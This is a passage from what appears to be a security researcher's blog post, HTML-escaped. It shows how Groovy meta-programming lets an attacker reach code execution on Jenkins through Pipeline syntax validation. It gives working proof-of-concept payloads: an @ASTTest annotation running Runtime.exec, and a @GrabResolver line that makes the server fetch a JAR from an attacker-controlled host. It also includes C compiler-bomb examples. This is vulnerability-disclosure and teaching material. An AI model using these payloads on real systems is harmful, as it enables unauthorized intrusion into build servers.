&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&#39;&#39;
print java.lang.Runtime.getRuntime().exec(&quot;id&quot;)
&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From the view of developers, the Pipeline can control Jenkins, so it must be dangerous and requires a strict permission check before every Pipeline invocation! However, this is just a simple syntax validation so the permission check here is more less than usual! Without any &lt;code class=&quot;highlighter-rouge&quot;&gt;execute()&lt;/code&gt; method, it’s just an AST parser and must be safe! This is what I thought when the first time I saw this validation. However, while I was writing the technique blog, Meta-Programming flashed into my mind!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;what-is-meta-programming&quot;&gt;What is Meta-Programming&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Meta-Programming is a kind of programming concept! The idea of Meta-Programming is providing an abstract layer for programmers to consider the program in a different way, and makes the program more flexible and efficient! There is no clear definition of Meta-Programming. In general, both processing the program by itself and writing programs that operate on other programs(compiler, interpreter or preprocessor…) are Meta-Programming! The philosophy here is very profound and could even be a big subject on Programming Language!&lt;/p&gt;

&lt;p&gt;If it is still hard to understand, you can just regard &lt;code class=&quot;highlighter-rouge&quot;&gt;eval(...)&lt;/code&gt; as another Meta-Programming, which lets you operate the program on the fly. Although it’s a little bit inaccurate, it’s still a good metaphor for understanding! In software engineering, there are also lots of techniques related to Meta-Programming. For example:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;C Macro&lt;/li&gt;
  &lt;li&gt;C++ Template&lt;/li&gt;
  &lt;li&gt;Java Annotation&lt;/li&gt;
  &lt;li&gt;Ruby (Ruby is a Meta-Programming friendly language, even there are books for that)&lt;/li&gt;
  &lt;li&gt;DSL(Domain Specific Languages, such as &lt;a href=&quot;http://sinatrarb.com/&quot;&gt;Sinatra&lt;/a&gt; and &lt;a href=&quot;https://gradle.org/&quot;&gt;Gradle&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;When we are talking about Meta-Programming, we classify it into &lt;strong&gt;(1)compile-time&lt;/strong&gt; and &lt;strong&gt;(2)run-time Meta-Programming&lt;/strong&gt; according to the scope. Today, we focus on the compile-time Meta-Programming!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. It’s hard to explain Meta-Programming in non-native language. If you are interested, here are some materials! &lt;a href=&quot;https://en.wikipedia.org/wiki/Metaprogramming&quot;&gt;Wiki&lt;/a&gt;, &lt;a href=&quot;https://stackoverflow.com/questions/2565572/metaprogramming-self-explanatory-code-tutorials-articles-books/2566561#2566561&quot;&gt;Ref1&lt;/a&gt;, &lt;a href=&quot;http://cs.lmu.edu/~ray/notes/metaprogramming/&quot;&gt;Ref2&lt;/a&gt;&lt;/em&gt;&lt;br /&gt;
&lt;em&gt;P.S. I am not a programming language master, if there is anything incorrect or inaccurate, please forgive me &amp;lt;(_ _)&amp;gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;how-to-exploit&quot;&gt;How to Exploit?&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;From the previous section we know Jenkins validates Pipeline by &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-&quot;&gt;parseClass(…)&lt;/a&gt; and learn that Meta-Programming can poke the parser during compile-time! Compiling(or parsing) is a hard work with lots of tough things and hidden features. So, the idea is, is there any side effect we can leverage?&lt;/p&gt;

&lt;p&gt;There are many simple cases which have proved Meta-Programming can make the program vulnerable, such as the macro expansion in C language:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define a 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1
#define b a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a
#define c b,b,b,b,b,b,b,b,b,b,b,b,b,b,b,b
#define d c,c,c,c,c,c,c,c,c,c,c,c,c,c,c,c
#define e d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d
#define f e,e,e,e,e,e,e,e,e,e,e,e,e,e,e,e
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int128&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;or the compiler resource bomb(make a 16GB ELF by just 18 bytes):&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;or calculating the Fibonacci number by compiler&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 55&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 6765&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 102334155&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From the assembly language of compiled binary, we can make sure the result is calculated at compile-time, not run-time!&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;g++ template.cpp &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; template
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-M&lt;/span&gt; intel &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; template
...
00000000000005fa &amp;lt;main&amp;gt;:
 5fa:   55                      push   rbp
 5fb:   48 89 e5                mov    rbp,rsp
 5fe:   c7 45 f4 37 00 00 00    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0xc],0x37
 605:   c7 45 f8 6d 1a 00 00    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x8],0x1a6d
 60c:   c7 45 &lt;span class=&quot;nb&quot;&gt;fc &lt;/span&gt;cb 7e 19 06    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x4],0x6197ecb
 613:   b8 00 00 00 00          mov    eax,0x0
 618:   5d                      pop    rbp
 619:   c3                      ret
 61a:   66 0f 1f 44 00 00       nop    WORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rax+rax&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;1+0x0]
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For more examples, you can refer to the article &lt;a href=&quot;https://codegolf.stackexchange.com/questions/69189/build-a-compiler-bomb&quot;&gt;Build a Compiler Bomb&lt;/a&gt; on StackOverflow!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;first-attempt&quot;&gt;First Attempt&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;Back to our exploitation, Pipeline is just a DSL built with Groovy, and Groovy is also a Meta-Programming friendly language. We start reading the Groovy official &lt;a href=&quot;http://groovy-lang.org/metaprogramming.html&quot;&gt;Meta-Programming manual&lt;/a&gt; to find some exploitation ways. In the section 2.1.9, we found the &lt;code class=&quot;highlighter-rouge&quot;&gt;@groovy.transform.ASTTest&lt;/code&gt; annotation. Here is its description:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;@ASTTest&lt;/code&gt; is a special AST transformation meant to help debugging other AST transformations or the Groovy compiler itself. It will let the developer “explore” the AST during compilation and &lt;strong&gt;perform assertions on the AST&lt;/strong&gt; rather than on the result of compilation. This means that this AST transformations gives access to the AST before the Bytecode is produced. &lt;code class=&quot;highlighter-rouge&quot;&gt;@ASTTest&lt;/code&gt; can be placed on any annotable node and requires two parameters:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;What! &lt;strong&gt;perform assertions on the AST&lt;/strong&gt;? Isn’t that what we want? Let’s write a simple Proof-of-Concept in local environment first:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&#39;&#39;
@groovy.transform.ASTTest(value={
    assert java.lang.Runtime.getRuntime().exec(&quot;touch pwned&quot;)
})
def x
&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;poc.groovy

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;groovy poc.groovy
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;poc.groovy  pwned
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cool, it works! However, while reproducing this on the remote Jenkins, it shows:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;unable to resolve class org.jenkinsci.plugins.workflow.libs.Library&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190219/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;What the hell!!! What’s wrong with that?&lt;/p&gt;

&lt;p&gt;With a little bit digging, we found the root cause. This is caused by the &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin&quot;&gt;Pipeline Shared Groovy Libraries Plugin&lt;/a&gt;! In order to reuse functions in Pipeline, Jenkins provides the feature that can import customized library into Pipeline! Jenkins will load this library before every executed Pipeline. As a result, the problem become lack of corresponding library in classPath during compile-time. That’s why the error &lt;code class=&quot;highlighter-rouge&quot;&gt;unsable to resolve class&lt;/code&gt; occurs!&lt;/p&gt;

&lt;p&gt;How to fix this problem? It’s simple! Just go to &lt;a href=&quot;http://jenkins.local/pluginManager/&quot;&gt;Jenkins Plugin Manager&lt;/a&gt; and remove the &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin&quot;&gt;Pipeline Shared Groovy Libraries Plugin&lt;/a&gt;! It can fix the problem and then we can execute arbitrary code without any error! But, this is not a good solution because this plugin is installed along with the Pipeline. It’s lame to ask administrator to remove the plugin for code execution! We stop digging this and try to find another way!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;second-attempt&quot;&gt;Second Attempt&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;We continued reading the &lt;a href=&quot;http://groovy-lang.org/metaprogramming.html&quot;&gt;Groovy Meta-Programming manual&lt;/a&gt; and found another interesting annotation - &lt;code class=&quot;highlighter-rouge&quot;&gt;@Grab&lt;/code&gt;. There is no detailed information about &lt;code class=&quot;highlighter-rouge&quot;&gt;@Grab&lt;/code&gt; on the manual. However, we found another article - &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/documentation/grape.html&quot;&gt;Dependency management with Grape&lt;/a&gt; on search engine!&lt;/p&gt;

&lt;p&gt;Oh, from the article we know Grape is a built-in JAR dependency management in Groovy! It can help programmers import the library which are not in classPath. The usage looks like:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@Grab&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;org.springframework&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;spring-orm&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;3.2.5.RELEASE&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.jdbc.core.JdbcTemplate&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;By using &lt;code class=&quot;highlighter-rouge&quot;&gt;@Grab&lt;/code&gt; annotation, it can import the JAR file which is not in classPath during compile-time automatically! If you just want to bypass the Pipeline sandbox via a valid credential and the permission of Pipeline execution, that’s enough. You can follow the &lt;a href=&quot;https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc&quot;&gt;PoC&lt;/a&gt; proveded by &lt;a href=&quot;https://github.com/adamyordan&quot;&gt;@adamyordan&lt;/a&gt; to execute arbitrary commands!&lt;/p&gt;

&lt;p&gt;However, without a valid credential and &lt;code class=&quot;highlighter-rouge&quot;&gt;execute()&lt;/code&gt; method, this is just an AST parser and you even can’t control files on remote server. So, what can we do? By diving into more about &lt;code class=&quot;highlighter-rouge&quot;&gt;@Grab&lt;/code&gt;, we found another interesting annotation - &lt;code class=&quot;highlighter-rouge&quot;&gt;@GrabResolver&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@GrabResolver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;restlet&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;http://maven.restlet.org/&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nd&quot;&gt;@Grab&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;org.restlet&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;org.restlet&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;1.1.6&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.restlet&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If you are smart enough, you would like to change the &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; parameter to a malicious website! Let’s try this in local environment:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&#39;&#39;
@GrabResolver(name=&#39;restlet&#39;, root=&#39;http://orange.tw/&#39;)
@Grab(group=&#39;org.restlet&#39;, module=&#39;org.restlet&#39;, version=&#39;1.1.6&#39;)
import org.restlet
&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;pre&gt;&lt;code class=&quot;language-log&quot;&gt;11.22.33.44 - - [18/Dec/2018:18:56:54 +0800] &quot;HEAD /org/restlet/org.restlet/1.1.6/org.restlet-1.1.6-javadoc.jar HTTP/1.1&quot; 404 185 &quot;-&quot; &quot;Apache Ivy/2.4.0&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Wow, it works! Now, we believe we can make Jenkins import any malicious library by Grape! However, the next problem is, how to get code execution?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;the-way-to-code-execution&quot;&gt;The Way to Code Execution&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;In the exploitation, the target is always escalating the read primitive or write primitive to code execution! From the previous section, we can write malicious JAR file into remote Jenkins server by Grape. However, the next problem is how to execute code?&lt;/p&gt;

&lt;p&gt;By diving into &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/Grape.java&quot;&gt;Grape implementation on Groovy&lt;/a&gt;, we realized the library fetching is done by the class &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/GrapeIvy.groovy&quot;&gt;groovy.grape.GrapeIvy&lt;/a&gt;! We started to find is there any way we can leverage, and we noticed an interesting method &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L312&quot;&gt;processOtherServices(…)&lt;/a&gt;!&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;processOtherServices&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ClassLoader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
